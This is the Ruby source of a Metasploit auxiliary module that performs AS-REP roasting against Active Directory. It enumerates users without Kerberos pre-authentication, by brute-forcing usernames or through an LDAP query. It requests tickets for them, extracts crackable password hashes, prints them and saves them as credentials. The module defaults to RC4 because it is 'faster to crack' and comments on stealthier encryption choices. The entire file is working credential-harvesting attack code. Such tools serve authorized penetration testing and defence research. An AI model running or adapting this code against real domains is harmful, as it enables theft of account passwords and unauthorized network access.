##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Kerberos::Client
  include Msf::Exploit::Remote::LDAP
  include Msf::Exploit::Remote::LDAP::Queries
  include Msf::OptionalSession::LDAP

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Find Users Without Pre-Auth Required (ASREP-roast)',
        'Description' => %q{
          This module searches for AD users without pre-auth required. Two different approaches
          are provided:
          - Brute force of usernames (does not require a user account; should not lock out accounts)
          - LDAP lookup (requires an AD user account)
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'smashery', # MSF Module
        ],
        'References' => [
          ['URL', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [],
          'AKA' => ['preauth', 'asreproast']
        },
        'Actions' => [
          ['BRUTE_FORCE', { 'Description' => 'Brute force to find susceptible user accounts' } ],
          ['LDAP', { 'Description' => 'Ask a domain controller directly for the susceptible user accounts' } ],
        ],
        'DefaultAction' => 'BRUTE_FORCE'
      )
    )

    register_options(
      [
        Opt::RHOSTS(nil, true, 'The target KDC, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html'),
        OptPath.new('USER_FILE', [ false, 'File containing usernames, one per line' ], conditions: %w[ACTION == BRUTE_FORCE]),
        OptBool.new('USE_RC4_HMAC', [ true, 'Request using RC4 hash instead of default encryption types (faster to crack)', true]),
        OptString.new('Rhostname', [ false, "The domain controller's hostname"], aliases: ['LDAP::Rhostname']),
      ]
    )
    register_option_group(name: 'SESSION',
                          description: 'Used when connecting to LDAP over an existing SESSION',
                          option_names: %w[RHOSTS],
                          required_options: %w[SESSION RHOSTS])
    register_advanced_options(
      [
        OptEnum.new('LDAP::Auth', [true, 'The Authentication mechanism to use', Msf::Exploit::Remote::AuthOption::NTLM, Msf::Exploit::Remote::AuthOption::LDAP_OPTIONS]),
      ]
    )
  end

  def run
    case action.name
    when 'BRUTE_FORCE'
      run_brute
    when 'LDAP'
      run_ldap
    end
  rescue Errno::ECONNRESET
    fail_with(Failure::Disconnected, 'The connection was reset.')
  rescue Rex::ConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
    fail_with(Failure::NoAccess, e.message)
  rescue Net::LDAP::Error => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def run_brute
    result_count = 0
    user_file = datastore['USER_FILE']
    username = datastore['LDAPUsername']
    if user_file.blank? && username.blank?
      fail_with(Msf::Module::Failure::BadConfig, 'User file or username must be specified when brute forcing')
    end
    if username.present?
      begin
        roast(datastore['LDAPUsername'])
        result_count += 1
      rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
        # User either not present, or requires preauth
        vprint_status("User: #{username} - #{e}")
      end
    end
    if user_file.present?
      File.open(user_file, 'rb') do |file|
        file.each_line(chomp: true) do |user_from_file|
          roast(user_from_file)
          result_count += 1
        rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
          # User either not present, or requires preauth
          vprint_status("User: #{user_from_file} - #{e}")
        end
      end
    end

    if result_count == 0
      print_error('No users found without preauth required')
    else
      print_line
      print_status("Query returned #{result_count} #{'result'.pluralize(result_count)}.")
    end
  end

  def run_ldap
    run_builtin_ldap_query('ENUM_USER_ASREP_ROASTABLE') do |result|
      username = result.samaccountname[0]
      begin
        roast(username)
      rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
        print_error("#{username} reported as ASREP-roastable, but received error when attempting to retrieve TGT (#{e})")
      end
    end
  end

  def roast(username)
    res = send_request_tgt(
      server_name: "krbtgt/#{datastore['domain']}",
      client_name: username,
      realm: datastore['LDAPDomain'],
      offered_etypes: etypes,
      rport: 88,
      rhost: datastore['RHOST']
    )
    hash = format_as_rep_to_john_hash(res.as_rep)
    print_line(hash)
    jtr_format = Metasploit::Framework::Hashes.identify_hash(hash)
    report_hash(hash, jtr_format)
  end

  def report_hash(hash, jtr_format)
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'Kerberos',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: hash,
      private_type: :nonreplayable_hash,
      jtr_format: jtr_format
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def etypes
    if datastore['USE_RC4_HMAC']
      [Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC]
    else
      # We could just ask for AES256, but we have an opportunity to be stealthier by asking for a normal set of etypes,
      # and expecting to receive AES256. This assumption may be broken in the future if additional encryption types are added
      Rex::Proto::Kerberos::Crypto::Encryption::DefaultOfferedEtypes
    end
  end

  attr_accessor :ldap_query # The LDAP query for this module, loaded from a yaml file

end
